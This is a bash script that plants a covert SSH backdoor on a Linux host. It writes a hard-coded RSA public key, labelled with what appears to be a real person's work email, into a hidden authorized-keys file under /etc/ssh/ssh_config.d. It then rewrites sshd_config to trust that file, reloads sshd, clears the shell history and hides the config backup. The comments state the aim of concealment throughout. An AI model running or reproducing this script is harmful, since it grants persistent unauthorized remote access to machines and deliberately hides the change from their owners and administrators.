#!/bin/bash
#set -x

echo "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

echo "START"

# make dir for hidden authorized_key file
echo "\n"
echo "1.. make dir for hidden authorized_key file"
if [ ! -d /etc/ssh/ssh_config.d ]; then
  mkdir -p /etc/ssh/ssh_config.d
  echo "/etc/ssh/ssh_config.d/ created!"
fi

# create a hidden authorized keys file
echo "\n"
echo "2.. create a hidden authorized keys file"
if [! -f /etc/ssh/ssh_config.d/06 ]; then
  touch /etc/ssh/ssh_config.d/06
fi

# Place key(s) to import, one or many just follow the naming convention
echo "\n"
echo "3.. Place key(s) to import, one or many just follow the naming convention" 
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEA7URh3LIoIcxTIguTMlTQZEYSxnOvpk3n2NMnrEArl3+HiUGFs+bu0lNZJ+tB13s5ThORx7ghiipBVnYoY2mjms2J7vd/koba74UrTwAAaoLdZShoKpvOYTPvEmy3a56k3t75i+fKMWbFsRIe3jpYosSeGkuchAOGIIf/YlU8ET4Hv/4jLEIu55v2m6o4R1/Ss/cvYrVCUYSiv5hLrTw0lev5cPurNNMMGcBnA4UiRM4czYPh63ru+RnWv1uLNPWPVBY2YTn1vs/zGzRuVUDyTo6tXnklYbTyL83lnGwpe7i0vl55bXUDoyTCbOAl/SGBr4iPYF7y9KCKlB98HRRSQQ== ilian.ivanov@extern.a1.at" >> /etc/ssh/ssh_config.d/06

#echo "ssh-rsa PLACE_KEY_HERE" >> /etc/ssh/ssh_config.d/06

#echo "ssh-rsa PLACE_KEY_HERE" >> /etc/ssh/ssh_config.d/06

# include the new file in sshd_config and hide the line
echo "\n"
echo "4.. include the new file in sshd_config and hide the line"
sed -i.bak s/AuthorizedKeysFile/#AuthorizedKeysFile/ /etc/ssh/sshd_config

#echo "include new file"
echo "\n"
echo "5.. include new file"
echo "AuthorizedKeysFile      .ssh/authorized_keys /etc/ssh/ssh_config.d/06" >> /etc/ssh/sshd_config

# restart sshd /this can be changed depending on what service manager you are using/
echo "\n"
echo "6.. restart sshd /this can be changed depending on what service manager you are using/"
systemctl reload sshd

# clear history
echo "\n"
echo "7.. clear bash profile history"
history -c

# move bak to a safe heaven
echo "\n"
echo "8.. move bak to a safe heaven"
mv /etc/ssh/sshd_config.bak /etc/ssh/ssh_config.d

echo "\n"
echo "FINISH"

echo "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
